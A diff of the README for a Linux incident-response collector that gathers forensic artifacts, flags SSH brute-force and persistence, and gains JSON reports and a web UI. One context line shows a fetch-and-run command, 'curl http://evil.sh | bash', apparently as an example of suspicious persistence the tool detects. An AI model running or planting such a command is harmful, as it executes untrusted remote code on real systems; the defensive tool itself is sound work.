@@ -1,26 +1,33 @@
 # linux-ir-collector
 
-A lightweight Linux Incident Response collector written in Python. Designed to be run on a potentially compromised system to gather forensic artifacts, detect common attack patterns, and generate a structured Markdown report.
-
+A lightweight Linux Incident Response collector written in Python. Designed to be run on a potentially compromised system to gather forensic artifacts, detect common attack patterns, and generate structured reports .
 
 ---
 
 ## Features
 
-- **6 specialized collectors** — system info, processes, network, users, logs, persistence
-- **SSH brute-force detection** — extracts attacker IPs and counts login attempts
-- **Persistence mechanism detection** — scans cron jobs and systemd units for suspicious commands
-- **Severity scoring** — rates findings as LOW / MEDIUM / HIGH / CRITICAL
-- **Timestamped output directory** — each run produces an isolated snapshot
-- **Zero external dependencies** — only Python 3 standard library
+- 6 specialized collectors - system info, processes, network, users, logs, persistence
+- OOP architecture - each collector extends BaseCollector
+- SSH brute-force detection - extracts attacker IPs and counts login attempts
+- Persistence mechanism detection - scans cron jobs, systemd units, and autostart entries
+- Severity scoring - rates findings as LOW / MEDIUM / HIGH / CRITICAL
+- Timeline view - chronological list of events extracted from logs
+- Dual report output - Markdown (report.md) and machine-readable JSON (report.json)
+- Artifact integrity - SHA-256 checksums for all collected files (checksums.sha256)
+- Timestamped output directory - each run produces an isolated snapshot
+- Web UI - browser-based report viewer with history, SSH stats, persistence view, and timeline
 
 ---
 
 ## Requirements
 
+#### Core collector
 - Linux (Debian/Ubuntu or RHEL/Fedora)
-- Python 3.6+
-- Root privileges (`sudo`)
+- Python 3.8+
+- Root privileges (sudo)
+#### Web UI
+- Python: fastapi, uvicorn
+- Node.js 18+ and npm
 
 ---
 
@@ -30,59 +37,48 @@ A lightweight Linux Incident Response collector written in Python. Designed to b
 git clone https://github.com/mh00909/linux-ir-collector.git
 cd linux-ir-collector
 ```
+### Install Web UI dependencies
+```
+# Backend
+pip install fastapi uvicorn --break-system-packages
+
+# Frontend
+cd web/frontend
+npm install
+```
 
 ---
 
 ## Usage
 
 ```bash
-sudo python3 main.py
+sudo python3 -m ir_collector.main
 ```
-
 > Root is required to read protected files such as `/etc/shadow`, `/var/log/auth.log`, and network socket information.
+
+#### Options
+```
+--output, -o    Output directory (default: report_YYYY-mm-dd_HHMMSS)
+--no-report     Collect raw artifacts only, skip report generation
+```
 
 After completion, a timestamped directory is created in the current working directory:
 
 ```
 ir_report_2026-03-07_14-22-01/
 ```
-
----
-
-## Output Structure
-
+### Start the Web UI
+### Backend
 ```
-ir_report_<timestamp>/
-│
-├── system/
-│   ├── uname.txt
-│   ├── uptime.txt
-│   ├── date.txt
-│   └── hostnamectl.txt
-│
-├── processes/
-│   ├── ps.txt
-│   ├── top.txt
-│   └── systemctl_failed.txt
-│
-├── network/
-│   ├── ip_a.txt
-│   ├── ip_route.txt
-│   └── ss.txt
-│
-├── users/
-│   ├── passwd.txt
-│   ├── group.txt
-│   └── shadow.txt
-│
-├── logs/
-│   └── auth.txt
-│
-├── persistence/
-│   └── cron.txt
-│
-└── report.md
+cd web/backend
+uvicorn app:app --reload
 ```
+### Frontend
+```
+cd web/frontend
+npm run dev
+```
+
 
 ---
 
@@ -129,31 +125,7 @@ curl http://evil.sh | bash
 ```
 
 ---
-
-## Report
-
-The final `report.md` summarizes all findings:
-
-```markdown
-# Linux Incident Response Report
-
-## System Information
-Kernel: 6.8.0
-Hostname: server01
-
-## SSH Attacks
-Detected 34 failed login attempts
-IPs:
-  192.168.1.10
-  5.188.10.22
-
-## Suspicious Persistence
-cron job using curl detected
-
-Severity: HIGH
-```
-
-Severity levels:
+### Severity levels:
 
 | Level    | Meaning                                      |
 |----------|----------------------------------------------|
@@ -164,16 +136,30 @@ Severity levels:
 
 ---
 
-## Typical Incident Response Workflow
+## Web UI
+The browser-based UI reads report.json from each run directory and presents findings in four tabs:
+- Overview - severity level, generated timestamp, list of reasons
+- SSH - failed login count, unique source IPs, top attacker table
+- Persistence - enabled services, timers, suspicious cron entries
+- Timeline - chronological event log extracted from auth logs
 
-```bash
-# 1. Suspected breach — run the collector
+### Stack
+- Backend: FastAPI, served on localhost:8000
+- Frontend: React 18, Vite 7, Tailwind CSS v4
+
+---
+## Typical Incident Response Workflow
+```
+# 1. Suspected breach - run the collector
 sudo python3 -m ir_collector.main
 
-# 2. Review the report
-less ir_report_<timestamp>/report.md
+# 2. Quick review in terminal
+less report_<timestamp>/report.md
 
-# 3. Package artifacts for offline analysis or hand-off
-tar -czf ir_report.tar.gz ir_report_<timestamp>/
+# 3. Open Web UI for full analysis
+cd web/backend && uvicorn app:app --reload &
+cd web/frontend && npm run dev
+
+# 4. Package artifacts for offline analysis or hand-off
+tar -czf ir_report.tar.gz report_<timestamp>/
 ```
-
